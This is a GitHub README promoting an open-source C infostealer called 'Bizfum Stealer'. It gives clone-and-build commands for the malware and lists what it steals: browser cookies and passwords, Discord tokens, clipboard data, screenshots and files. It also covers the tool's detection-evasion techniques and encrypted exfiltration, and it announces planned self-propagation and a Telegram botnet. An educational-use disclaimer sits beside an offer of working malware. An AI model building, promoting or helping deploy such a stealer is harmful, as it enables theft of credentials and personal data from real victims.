<h1 align="center"><i>Bizfum Stealer</i></h1>
<p align="center">
  <img src="https://github.com/user-attachments/assets/a9c78382-5178-4510-9dc3-f005926164da" alt="BIZFUM">
</p>

<p align="center">
  <strong>Bizfum Stealer</strong> is a 2024-developed open source stealer malware. It performs common data exfiltration tasks while leveraging pre-installed Windows DLLs and utilizing NTAPI for WinAPI calls, minimizing suspicion. This repository will be updated in the near future. Stars would greatly support this project!
</p>


## 📑 Table of Contents
- [Installation](#installation)
- [Purpose of the Project](#purpose)
- [Current Features](#current-features)
- [Coming Features](#coming-features)
- [DLLs the Stealer Takes Advantage of](#dlls-the-stealer-takes-advantage-of)
- [Repository Structure](#repository-structure)
- [Disclaimer](#disclaimer)
- [Known Issues](#known-issues)

## ⚙️ Installation
The installation process is straightforward. Clone the repository and choose the desired version, as indicated in the repository structure. For instance, to install the version with debug information:

**Bash**
```bash
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer/debug-version && chmod +x build.sh && ./build.sh
```

**Powershell**
```powershell
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; Start-Process "build.bat"
```
**Batch**
```cmd
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && .\build.bat
```

## ❓ Purpose
With years of experience in web hacking, I ventured into malware development to explore a second facet of the hacking landscape. Bizfum Stealer serves as a proof-of-concept (PoC) and is not intended for malicious activities. While it may not be fully undetectable (FUD), creating a loader could enhance its stealth capabilities. However, I am really sure, if I shared my UD loader, it would lead into unethical uses.

My personal interest in this project stems from the lack of open-source C-based stealers on GitHub. Most available options are either outdated or poorly maintained. While languages like C++ and C# are more prevalent, I believe C remains a powerful choice for this type of development.

## ✨ Current Features
- Utilizes NtAPI to reduce the likelihood of detection.
- Dynamically loading pre-installed Dynamic Link Libraries of Windows.
- Captures screenshots and saves them as bitmap files.
- Extracts pictures and files based on specific names or extensions.
- Steals clipboard data.
- Captures Discord tokens.
- Stealing of Chrome and Firefox cookies + passwords.
- Zipping of stolen data -> AES Encryption of ZIP file -> RSA Encryption of AES Encryption Key.

## 🛠️ Coming Features
- Other browser theft.
- Self-propagation through applications such as Discord.
- Uses `winhttp.dll` to upload stolen data to gofile.io via their API.
- Extraction of game tokens or credentials.
- Potential development of a Telegram-based botnet without requiring constant connectivity or request spamming.

## 🧬 DLLs the Stealer Takes Advantage of
- C:\Program Files\Mozilla Firefox\nss3.dll ( If Firefox is installed )
- C:\Windows\System32\winsqlite3.dll
- C:\Windows\System32\crypt32.dll
- C:\Windows\System32\bcrypt.dll
- C:\Windows\System32\ole32.dll
- C:\Windows\System32\ntdll.dll
- C:\Windows\System32\gdi32.dll

## 🗂️ Repository Structure
The repository includes both DLL and EXE versions of the malware. This allows for use of for example a *Reflective DLL Loader*. Both versions have been tested on Windows 10 and Windows 11.

Additionally, a version with debug information is available that does not connect anywhere. The version without debug information will send data and function correctly if set up properly.

## 📜 Disclaimer

| ⚠️ **WARNING! READ THIS BEFORE USING THE PROJECT**:

This software is intended for **educational and research purposes only**. **I do not condone or support any illegal or unethical use of this software.** Use this tool responsibly and within the boundaries of the law. The author is **not liable** for any misuse or consequences resulting from the use of this software.

---

### 🔒 Purpose of Telegram Integration

- This project may use **Telegram** for the **sole purpose of sharing a download link to data**, and **NOT** for transmitting or exposing any raw, stolen, or sensitive information directly.
- All data that may be transmitted via this project is protected by **encryption** methods:
  - Data is first encrypted using **AES (Advanced Encryption Standard)** with a **32-byte key**.
  - The AES key is then further encrypted using **RSA encryption** for additional security.

This ensures that the data itself is **unreadable** and **inaccessible** without the appropriate decryption keys.

---

### ❗ User Responsibility and Legal Considerations

- You are **solely responsible** for any use or misuse of this project. By downloading, modifying, or running the code in any environment, **you accept full liability** for any consequences that may arise from its use.
- This project is **NOT designed for, nor does it condone, any illegal or unethical activity**, including but not limited to:
  - Unauthorized access to systems or personal information.
  - Phishing, data theft, or exploitation.
  - Violation of any platform’s **Terms of Service** (including but not limited to Telegram and Discord).
  - Any activity prohibited by **local, national, or international laws**, including but not limited to laws on **data privacy**, **computer misuse**, or **hacking**.

The developer does **NOT support or promote** the usage of this code for **malicious actions**, including but not limited to:
- **Stealing** sensitive information without explicit consent.
- Engaging in **malicious hacking**, phishing, or exploiting vulnerabilities.
- Violation of the **Computer Fraud and Abuse Act (CFAA)**, **General Data Protection Regulation (GDPR)**, or other **data privacy and security regulations**.

If you decide to use this project in any way that **violates the law** or the **Terms of Service** of any platform, including **Telegram**, the developer is in **NO WAY LIABLE** for your actions, and you agree to **indemnify and hold harmless** the developer for any claims or damages arising out of such use.

---

### ❌ Final Note

By downloading or using this project, you confirm that:

- You will **NOT** use this code for **illegal, unethical, or malicious purposes**.
- The developer assumes **ZERO liability** for any actions, damages, or legal consequences arising from your use or misuse of this project.

If you do not agree to the above terms, **DO NOT use or interact** with this project in any way.


## 📝 Update Log
V0.1 - 19th of September - Project started.

V0.2 - 26th of September - Added Firefox and Chrome (cookie / password) (decryption / stealing).

V0.3 - 3rd of October    - Added Zipping of stolen data && AES Encryption of ZIP file && RSA Encryption of AES Key && Base64 Encoding of RSA encrypted AES Key

## 🐞 Known Issues
- SQLite function calls act in a unexpected way for 64-bit os.

